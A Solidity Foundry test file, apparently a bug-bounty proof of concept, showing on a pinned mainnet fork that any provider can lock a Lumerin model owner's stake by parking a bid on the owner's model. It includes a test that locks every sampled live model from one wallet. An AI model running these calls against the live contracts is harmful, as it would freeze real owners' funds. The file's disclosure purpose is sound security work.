// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/**
 * BP-006 - Lumerin diamond (Base 8453): a model owner's only exit for `Model.stake` is
 * `modelDeregister`, and any unprivileged registered provider can permanently block it by
 * parking a bid on the owner's model.
 *
 *   ModelRegistry.modelDeregister  -> `if (!_isModelActiveBidsEmpty(modelId)) revert ModelHasActiveBids();`
 *   `modelActiveBids[m]` is emptied only by `BidStorage._deleteBid` (private), whose two call
 *   sites are `Marketplace.deleteModelBid` and the replace-branch of `Marketplace.postModelBid`.
 *   Both run `_validateDelegatee(msg.sender, bid.provider, DELEGATION_RULES_MARKETPLACE)`, so
 *   only the bid's own provider (or a wallet that provider delegated) can remove it.
 *
 * The provider's side is symmetric in code but not in reach: `providerActiveBids[p]` only ever
 * holds p's own bids, so `providerDeregister` is self-releasable. The model owner has no such
 * property - that asymmetry is the finding.
 *
 * Fork-only, pinned block, read-only against mainnet state: nothing is broadcast and no private
 * key is used. `victim` and `attacker` are `makeAddr` test wallets; the two live-state tests
 * simulate calls *as* the real model owner and the real blocking provider with `vm.prank`, which
 * on a fork is a read of deployed state, not an attack on anyone. No protocol owner, admin or
 * multisig is pranked anywhere in this file, and the mechanism does not depend on one.
 *
 * Run:  BASE_RPC=https://base-rpc.publicnode.com forge test -vv
 */
interface IERC20Like {
    function balanceOf(address) external view returns (uint256);

    function approve(address, uint256) external returns (bool);
}

/// `Model memory` is returned as one dynamic struct, so its encoding carries a leading offset
/// word - declaring the eight fields flat decodes them one slot early and asserts on garbage.
/// (Verified against `IModelStorage.sol` and against the raw returndata of the census.)
interface ILumerin {
    struct Model {
        bytes32 ipfsCID;
        uint256 fee;
        uint256 stake;
        address owner;
        string name;
        string[] tags;
        uint128 createdAt;
        bool isDeleted;
    }

    function getModel(bytes32) external view returns (Model memory);

    function getModelActiveBids(bytes32, uint256, uint256) external view returns (bytes32[] memory, uint256);

    function getActiveModelIds(uint256, uint256) external view returns (bytes32[] memory, uint256);

    function getBid(bytes32) external view returns (
        address provider, bytes32 modelId, uint256 pricePerSecond, uint256 nonce, uint128 createdAt, uint128 deletedAt
    );

    function getModelMinimumStake() external view returns (uint256);

    function getProviderMinimumStake() external view returns (uint256);

    function getMinMaxBidPricePerSecond() external view returns (uint256, uint256);

    function getBidFee() external view returns (uint256);

    function getToken() external view returns (address);

    function getModelId(address, bytes32) external pure returns (bytes32);

    function modelRegister(address, bytes32, bytes32, uint256, uint256, string calldata, string[] calldata) external;

    function modelDeregister(bytes32) external;

    function providerRegister(address, uint256, string calldata) external;

    function postModelBid(address, bytes32, uint256) external returns (bytes32);

    function deleteModelBid(bytes32) external;
}

/// The two custom errors the lock is made of, with the selectors this run measured off the
/// deployed dispatcher (`deployments/lumerin-diamond-facets.md`).
error ModelHasActiveBids();
/// `DelegationStorage._validateDelegatee` reverts `InsufficientRightsForOperation(delegator_,
/// delegatee_)` - that order, so the wallet whose authority is missing comes first.
error InsufficientRightsForOperation(address delegator, address delegatee);

contract LumerinModelStakeFreezeTest is Test {
    uint256 internal constant FORK_BLOCK = 53467416;
    string internal constant RPC_ENV = "BASE_RPC";

    address internal constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address internal constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;

    // one of the 159 models the census found already locked at this block
    bytes32 internal constant LIVE_MODEL = 0x2e7228fe07523d84307838aa617141a5e47af0e00b4eaeab1522bc71985ffd11;
    address internal constant LIVE_OWNER = 0x8B59eC5Da5E5CE83abB3BD9079472f7B25666302;

    ILumerin internal lumerin = ILumerin(DIAMOND);
    IERC20Like internal mor = IERC20Like(MOR);

    address internal victim = makeAddr("modelOwner");
    address internal attacker = makeAddr("provider");

    uint256 internal modelMin;
    uint256 internal providerMin;
    uint256 internal bidFee;
    uint256 internal minPrice;
    bytes32 internal lockedModel;

    function setUp() public {
        vm.createSelectFork(vm.envString(RPC_ENV), FORK_BLOCK);

        assertEq(lumerin.getToken(), MOR, "stake token is MOR");
        assertEq(ModelHasActiveBids.selector, bytes4(0x633910a0), "error selector measured on chain");
        assertEq(InsufficientRightsForOperation.selector, bytes4(0x2e980d14), "error selector measured on chain");

        modelMin = lumerin.getModelMinimumStake();
        providerMin = lumerin.getProviderMinimumStake();
        bidFee = lumerin.getBidFee();
        (minPrice,) = lumerin.getMinMaxBidPricePerSecond();
        console.log("live modelMinimumStake", modelMin);
        console.log("live providerMinimumStake", providerMin);
        console.log("live bidFee", bidFee);
        console.log("live bidMinPricePerSecond", minPrice);

        _victimRegistersModel();
    }

    /// victim stakes the protocol minimum on a model of its own - the money the lock holds.
    function _victimRegistersModel() internal {
        deal(MOR, victim, modelMin);
        vm.startPrank(victim);
        mor.approve(DIAMOND, type(uint256).max);
        string[] memory tags = new string[](1);
        tags[0] = "poc";
        lumerin.modelRegister(victim, bytes32(uint256(0xB00)), bytes32("poc-cid"), 0, modelMin, "poc-model", tags);
        vm.stopPrank();

        lockedModel = lumerin.getModelId(victim, bytes32(uint256(0xB00)));
        ILumerin.Model memory created = lumerin.getModel(lockedModel);
        assertEq(created.owner, victim, "model belongs to the victim");
        assertEq(created.stake, modelMin, "victim's stake is escrowed in the diamond");
    }

    /// attacker becomes a registered provider and parks a bid on the victim's model, paying the
    /// 0.3 MOR fee - the whole cost of the lock.
    function _attackerParksBid() internal returns (bytes32 bidId) {
        deal(MOR, attacker, providerMin + bidFee);
        vm.startPrank(attacker);
        mor.approve(DIAMOND, type(uint256).max);
        lumerin.providerRegister(attacker, providerMin, "poc.example.com:4000");
        bidId = lumerin.postModelBid(attacker, lockedModel, minPrice);
        vm.stopPrank();

        (bytes32[] memory active,) = lumerin.getModelActiveBids(lockedModel, 0, 10);
        assertEq(active.length, 1, "the parked bid is in modelActiveBids");
        (address bidProvider,, , , , ) = lumerin.getBid(bidId);
        assertEq(bidProvider, attacker, "the bid is the attacker's, not the owner's");
    }

    // ------------------------------------------------------------------
    // CANDIDATE - the lock exists, is installed by an unprivileged wallet,
    // and the model owner cannot get its stake out.
    // ------------------------------------------------------------------

    function test_candidate_thirdPartyBidBlocksTheOwnersOnlyStakeExit() public {
        _attackerParksBid();

        uint256 victimBalance = mor.balanceOf(victim);

        // (1) the only writer that reduces Model.stake reverts
        vm.prank(victim);
        vm.expectRevert(ModelHasActiveBids.selector);
        lumerin.modelDeregister(lockedModel);

        // (2) the call that would empty modelActiveBids is not the owner's to make
        (bytes32[] memory active,) = lumerin.getModelActiveBids(lockedModel, 0, 10);
        vm.prank(victim);
        vm.expectRevert(abi.encodeWithSelector(InsufficientRightsForOperation.selector, attacker, victim));
        lumerin.deleteModelBid(active[0]);

        // (3) the value stays where it is: nothing moved, nothing burned, no time-based release
        uint256 stake = lumerin.getModel(lockedModel).stake;
        assertEq(stake, modelMin, "stake still escrowed");
        assertEq(mor.balanceOf(victim), victimBalance, "victim received nothing");
        assertEq(mor.balanceOf(DIAMOND) >= modelMin, true, "the diamond still holds the stake");
        console.log("LOCKED victim stake stuck in the diamond (MOR-wei)", stake);
        console.log("LOCKED victim MOR balance after both reverts", victimBalance);
    }

    function test_candidate_liveModelIsAlreadyLockedAtThePinnedBlock() public {
        ILumerin.Model memory live = lumerin.getModel(LIVE_MODEL);
        address owner = live.owner;
        uint256 stake = live.stake;
        assertEq(owner, LIVE_OWNER, "census owner still holds the model");
        (bytes32[] memory active,) = lumerin.getModelActiveBids(LIVE_MODEL, 0, 10);
        assertGt(active.length, 0, "an active bid is parked on the live model");
        (address bidProvider,, , , , ) = lumerin.getBid(active[0]);
        assertTrue(bidProvider != owner, "the blocking bid belongs to somebody else");

        vm.prank(owner);
        vm.expectRevert(ModelHasActiveBids.selector);
        lumerin.modelDeregister(LIVE_MODEL);

        vm.prank(owner);
        vm.expectRevert(abi.encodeWithSelector(InsufficientRightsForOperation.selector, bidProvider, owner));
        lumerin.deleteModelBid(active[0]);

        console.log("LIVE model blocked: owner", owner);
        console.log("LIVE model blocked: stake escrowed", stake);
        console.log("LIVE model blocked: the bid belongs to provider", bidProvider);
    }


    /// The add-side of the same variable. ModelRegistry.sol:44 is `newStake_ = model.stake +
    /// amount_` and :62 writes it back with no bid check and no cap, so a top-up into an
    /// already-locked model is accepted and joins the hostage amount. The lock is bounded only
    /// by how much the owner chooses to park - nothing in the protocol bounds it.
    function test_candidate_topUpIntoALockedModelIsAcceptedAndAlsoLocked() public {
        _attackerParksBid();

        uint256 topUp = modelMin * 10;
        deal(MOR, victim, topUp);
        string[] memory tags = new string[](1);
        tags[0] = "poc";
        vm.prank(victim);
        mor.approve(DIAMOND, type(uint256).max);
        vm.prank(victim);
        lumerin.modelRegister(victim, bytes32(uint256(0xB00)), bytes32("poc-cid"), 0, topUp, "poc-model", tags);

        uint256 stake = lumerin.getModel(lockedModel).stake;
        assertEq(stake, modelMin + topUp, "the add path took the top-up with a foreign bid parked");

        vm.prank(victim);
        vm.expectRevert(ModelHasActiveBids.selector);
        lumerin.modelDeregister(lockedModel);

        assertEq(lumerin.getModel(lockedModel).stake, modelMin + topUp, "the grown amount is locked too");
        console.log("TOP-UP: hostage size after an unchecked top-up (MOR-wei)", stake);
    }

    /// Scale without cooperation. postModelBid is authorised over the caller's own provider
    /// identity (Marketplace.sol:68), so one wallet needs no victim's key, no victim's approval
    /// and no victim's knowledge to lock every active model it points at - and each lock is
    /// then verified from the victim's side in the same test.
    function test_candidate_oneWalletLocksEveryActiveModelItPointsAt() public {
        (bytes32[] memory ids, uint256 total) = lumerin.getActiveModelIds(0, 25);
        assertGt(total, 10, "the deployment has active models");
        assertGt(ids.length, 0, "sampled live models");

        deal(MOR, attacker, providerMin + bidFee * ids.length);
        vm.prank(attacker);
        mor.approve(DIAMOND, type(uint256).max);
        vm.prank(attacker);
        lumerin.providerRegister(attacker, providerMin, "poc.example.com:4000");

        uint256 locked;
        uint256 stakeBehindThem;
        address firstOwner;
        for (uint256 i; i < ids.length; i++) {
            ILumerin.Model memory m = lumerin.getModel(ids[i]);
            if (m.owner == attacker) {
                continue;
            }
            vm.prank(attacker);
            lumerin.postModelBid(attacker, ids[i], minPrice);

            (bytes32[] memory active,) = lumerin.getModelActiveBids(ids[i], 0, 30);
            bytes32 myBid;
            for (uint256 j; j < active.length; j++) {
                (address p, , , , , ) = lumerin.getBid(active[j]);
                if (p == attacker) {
                    myBid = active[j];
                }
            }
            assertTrue(myBid != bytes32(0), "the attacker's bid is an active bid on a stranger's model");

            vm.prank(m.owner);
            vm.expectRevert(ModelHasActiveBids.selector);
            lumerin.modelDeregister(ids[i]);

            vm.prank(m.owner);
            vm.expectRevert(
                abi.encodeWithSelector(InsufficientRightsForOperation.selector, attacker, m.owner));
            lumerin.deleteModelBid(myBid);

            locked++;
            stakeBehindThem += m.stake;
            if (firstOwner == address(0)) {
                firstOwner = m.owner;
            }
        }

        assertEq(locked, ids.length, "every sampled live model is now blocked");
        assertTrue(firstOwner != address(0), "real owners, not test wallets");
        console.log("SCALE: live models blocked by one unprivileged wallet", locked);
        console.log("SCALE: escrowed stake now behind those bids (MOR-wei)", stakeBehindThem);
        console.log("SCALE: cost to the attacker, bidFee x models (MOR-wei)", bidFee * locked);
    }

    // ------------------------------------------------------------------
    // NEGATIVE CONTROL - the exit works, and it works for exactly one
    // caller: whoever parked the bid. So the block is real (candidate) and
    // not a broken ABI, a paused diamond or a wrong `from`.
    // ------------------------------------------------------------------

    function test_control_ownerExitsWithItsStakeWhenNoBidIsParked() public {
        uint256 before_ = mor.balanceOf(victim);
        uint256 stake = lumerin.getModel(lockedModel).stake;

        vm.prank(victim);
        lumerin.modelDeregister(lockedModel);

        ILumerin.Model memory after_ = lumerin.getModel(lockedModel);
        assertEq(after_.stake, 0, "stake released");
        assertEq(bool(after_.isDeleted), true, "model marked deleted");
        assertEq(mor.balanceOf(victim), before_ + stake, "the owner got its stake back");
        console.log("CONTROL: no third-party bid, owner exited with stake (MOR-wei)", stake);
    }

    function test_control_onlyTheProviderThatParkedTheBidCanReleaseIt() public {
        bytes32 bidId = _attackerParksBid();

        vm.prank(victim);
        vm.expectRevert(ModelHasActiveBids.selector);
        lumerin.modelDeregister(lockedModel);

        // the attacker - and nobody else - holds the key
        vm.prank(attacker);
        lumerin.deleteModelBid(bidId);
        (bytes32[] memory active,) = lumerin.getModelActiveBids(lockedModel, 0, 10);
        assertEq(active.length, 0, "provider emptied modelActiveBids");

        // ... and once it does, the owner's exit works immediately, same block, same state
        uint256 before_ = mor.balanceOf(victim);
        uint256 stake = lumerin.getModel(lockedModel).stake;
        vm.prank(victim);
        lumerin.modelDeregister(lockedModel);
        assertEq(mor.balanceOf(victim), before_ + stake, "owner exits after the provider releases");
        console.log("CONTROL: after the provider deletes its bid the owner deregisters - the "
                    "release is unilateral");
    }

    /// Concession, executed rather than asserted in prose: the triager is right that the lock
    /// blocks the exit, not the administration. modelRegister with amount_ = 0 touches no
    /// transfer (:50) and consults no bid set, so the owner can still rewrite ipfsCID, fee,
    /// name and tags of a model whose stake it cannot get out.
    function test_control_ownerKeepsAdministrationOfALockedModelButNotExit() public {
        _attackerParksBid();

        string[] memory tags = new string[](1);
        tags[0] = "renamed";
        vm.prank(victim);
        lumerin.modelRegister(victim, bytes32(uint256(0xB00)), bytes32("renamed-cid"), 0, 0, "renamed", tags);

        ILumerin.Model memory m = lumerin.getModel(lockedModel);
        assertEq(m.name, "renamed", "administration survives the lock");
        assertEq(m.ipfsCID, bytes32("renamed-cid"), "metadata rewrite works on a locked model");
        assertEq(m.stake, modelMin, "and the locked stake is untouched");

        vm.prank(victim);
        vm.expectRevert(ModelHasActiveBids.selector);
        lumerin.modelDeregister(lockedModel);
        console.log("CONCESSION: the owner keeps control of the listing; only the stake exit is blocked");
    }

}
